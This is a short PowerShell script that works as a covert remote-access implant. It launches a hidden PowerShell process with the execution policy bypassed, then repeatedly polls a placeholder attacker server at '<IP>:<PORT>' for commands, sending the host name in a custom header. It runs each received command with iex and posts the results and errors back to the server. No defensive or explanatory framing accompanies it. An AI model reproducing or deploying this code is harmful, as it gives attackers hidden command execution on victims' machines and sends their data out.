$scriptBlock = "
    `$s = '<IP>:<PORT>'
    `$i = (Get-ComputerInfo.CSName).CSName.Trim()
    `$p = 'http://'
    while (`$true){
        `$c = (Invoke-WebRequest -UseBasicParsing -Uri `$p`$s/berzerkget -Headers @{ 'X-1412-93e6'=`$i }).Content
        if (`$c -ne 'None') {
            `$r = iex `$c -ErrorAction Stop -ErrorVariable e
            `$r = Out-String -InputObject `$r
            `$t = Invoke-WebRequest -Uri `$p`$s/berzerkpost -Method POST -Headers @{ 'X-1412-93e6'=`$i } -Body ([System.Text.Encoding]::UTF8.GetBytes(`$e+`$r) -join ' ')
            sleep 2
        }
    }
"

Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"$scriptBlock`"" -WindowStyle hidden